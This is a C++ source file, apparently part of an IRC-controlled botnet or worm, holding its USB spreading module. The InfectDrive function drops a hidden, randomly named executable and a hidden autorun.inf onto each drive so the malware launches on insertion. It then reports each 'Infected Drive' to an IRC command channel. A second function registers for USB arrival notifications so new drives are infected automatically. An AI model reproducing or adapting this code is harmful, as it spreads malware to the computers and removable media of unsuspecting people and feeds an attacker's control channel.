#include "../spreading.hpp"
#include "../../Core/core.hpp"

DWORD __stdcall InfectDrive( USBI *usb ) {
	try {
		API *api = ((API*)usb->api);
		string name = ((API*)usb->api)->GenFileName(8) + ".exe";
		if (!dumpFile(((API*)usb->api), usb->drive, name))
			throw -1;
		((API*)usb->api)->SetFileAttributesA((usb->drive + name).c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
		string autorundata = "[autorun]\r\nShellExecute=" + name;
		HANDLE file = NULL;
		DWORD size = 0;						
		if ((file = ((API*)usb->api)->CreateFileA((usb->drive + "autorun.inf").c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0))) {
			if (!((API*)usb->api)->WriteFile(file, autorundata.c_str(), autorundata.length(), &size, NULL)) {
				((API*)usb->api)->CloseHandle(file);
				throw -1;
			}
			((API*)usb->api)->CloseHandle(file);
			((API*)usb->api)->SetFileAttributesA((usb->drive + "autorun.inf").c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
			((IRC*)usb->irc)->IRCSend(IRC_MSG, ((IRC*)usb->irc)->servers[((IRC*)usb->irc)->currserver].channel, "Infected Drive " + usb->drive);
			throw 0;
		}
		throw -1;
	} catch(int e) {
		try { delete usb; } catch (...) {}
		switch(e) {
			case 0:
				return true;
				break;
			case -1:
				return false;
				break;
		}
	}
	return 0;

}

void RegisterNotification(API *api, HWND hwnd) {
	API::DEV_BROADCAST_DEVICEINTERFACE NotificationFilter; 
	HDEVNOTIFY hDeviceNotify = NULL; 
 
	GUID USB = { 0x25dbce51, 0x6c8f, 0x4a72, 
                      0x8a,0x6d,0xb5,0x4c,0x2b,0x4f,0xc8,0x35 };

	ZeroMemory(&NotificationFilter, sizeof(NotificationFilter)); 
	NotificationFilter.dbcc_size = sizeof(API::DEV_BROADCAST_DEVICEINTERFACE); 
	NotificationFilter.dbcc_devicetype = 0x00000005; 
	NotificationFilter.dbcc_classguid = USB; 
 
	hDeviceNotify = api->RegisterDeviceNotification(hwnd, &NotificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);
	return;
}


